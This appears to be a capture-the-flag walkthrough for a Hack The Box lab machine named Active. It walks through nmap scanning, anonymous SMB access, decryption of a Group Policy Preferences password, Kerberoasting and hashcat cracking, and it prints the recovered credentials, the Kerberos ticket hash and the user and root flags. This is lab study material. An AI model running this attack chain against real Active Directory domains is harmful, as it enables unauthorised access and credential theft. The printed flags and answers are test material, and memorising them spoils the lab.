@@ -1,0 +1,155 @@
+Machine: Active
+TAEGET: 10.129.225.44
+
+Task 1
+
+How many SMB shares are shared by the target?
+
+nmap -Pn -n --open -p- --max-retries 1 --min-rate 2000 $ip
+
+53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49168 
+
+nmap -sV -sC -oA nmap/Active $ip -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49168
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-02 14:14:35Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49162/tcp open  msrpc         Microsoft Windows RPC
+49166/tcp open  msrpc         Microsoft Windows RPC
+49168/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+smbclient -L //$ip -N             
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+
+> 7
+
+Task 2
+
+What is the name of the share that allows anonymous read access?
+
+> Replication 
+
+Task 3
+
+Which file has encrypted account credentials in it?
+
+smbclient //10.129.225.44/Replication -N
+
+Replication 공유파일 접속해서 파일탐색
+
+\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
+
+cat Groups.xml 
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+
+> Groups.xml 
+
+
+Task 4
+
+What is the decrpyted password for the SVC_TGS account?
+
+gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
+
+> GPPstillStandingStrong2k18
+
+
+
+
+Submit User Flag
+
+Submit the flag located on the security user's desktop.
+
+smbclient -U 'ACTIVE\SVC_TGS' //$ip/Users
+smb: \SVC_TGS\Desktop\> get user.txt 
+cat user.txt
+
+> 2b1315e704553f8423562cb29ed99ea1
+
+
+
+Task 6
+
+Which service account on Active is vulnerable to Kerberoasting?
+
+GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip $ip
+/usr/local/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250508.104819.fde4265a', 'GetUserSPNs.py')
+Impacket v0.13.0.dev0+20250508.104819.fde4265a - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-08-02 10:06:25.916543             
+
+> Administrator
+
+
+Task 7
+
+What is the plaintext password for the administrator account?
+
+
+GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip $ip -request
+/usr/local/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250508.104819.fde4265a', 'GetUserSPNs.py')
+Impacket v0.13.0.dev0+20250508.104819.fde4265a - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-08-02 10:06:25.916543             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$a82f0059de519a5b986671bc73405695$cef17a1f2b2fd06ac9160e53140ca24498a6694995294557dfb9f476546ca0ef4b25ae65957e46d00ab27464e1b5f38a661f43ec32b55a47ef501e13b35b29571197fdc09ff26d51138d2d8cbe258150a3a574e19a71107b20c64373594a1b70938b0eae3a9ba02da642ea74bbfb8337a2d1d6896e41991ccbd4cb656099263deee09edf7a55e32c492d08fcb080d7b6bf8bf60d6d9cdecf634186657d5a7e15f967ba254749521fc9eb31aa355369a077ace214c89825e5b9b9e5d5d6decbd5717d0ae5f675c975a12c5af4a3646898761a17f0dc4fb72c3bbecca7d00457f770d71022827faa9aad9862ff9019acc759ba501974f4d958928cd588aea2cf66c851560ae9d4c30db2c717a66e8b67896b03159ea5ab8ce565780c038153dbda432c93111d52cab033c78eed4866172e8adf9c3557a22a3ab2696df30636c4ad6cd9439ec21e2853c80f73f2b7f8fb6783ddb55d64f2c1e1190da37be35b6bc0047ba8e93954dbb4a762805a487d8b2a0df7de17e65a9171d7dbc14dea31cbe4ff1187cb8dab7fa45ee69805802b992ef51b85d149ced86e0f02910c75f426c1fbcec29ec0c6b2843f03f07be5fb1d8520fe0bdb22f9738d4cfe6aac1717d3e78d1bffc998c87899731024b4663101c5f694c3c61d75d2fa7ffcb6fe52b9deb171c09bdd588a128fc2772b3b60a71f5a925fb27a6d82d0df7733f223a188f230ca17a505ba041beba207bea5c8d1e5c5a998b1f84b326cb2b83a1e31235bc65b4f3e76f977d18ba5b70c1a66a9f338619a02095e568eb1630a6becc0ae633f4ebf46d32366ff78a1b8cfb02f19d79cf42708b60af062b3ee71c1582a2ecfc5ed89fe43d1b210beb62d3f47a039dbfdaf562bd9595e681a26a57f400bdbccf9733de6bbd4c5adf7c1752861633f7ee95c3d61132718673dfd6c409ac160960f52bb9a339204b5dd6c59cc078a018452ebf63d9fa3b8e8d2d0b69c7dae24d6a68bc92ba2f492422697b076136a545e3a6b802d3c199adab305925f7120af49ab6e9a4d6c76e6e31ab6834b339051a4cb18f43c87b34e634f93f82997f2103d9b43c3adb752a5c25820ee159ced1ec670fbaf6408d9b8cb66cefea67a8f32430b30575994be87b41cbc7e4e4c8aa12d9310fcfab5671e037bc5d67f768f61f2a3dbddd2847ed1736873edf03ad1cdddaef135d92f0a97e1c0879bfea8ab3430e699603a1c6a4bfda71adbd1e1f86a902da5968262c448b467749e5e
+
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
+
+Ticketmaster1968
+
+> Ticketmaster1968
+
+Submit Root Flag
+
+Submit the flag located on the administrator's desktop.
+smbclient -U 'ACTIVE\Administrator' //$ip/Users
+smb: \Administrator\Desktop\> get root.txt 
+getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+
+cat root.txt
+> 1fdde5163e1c0ee88a54fa5facb901a1
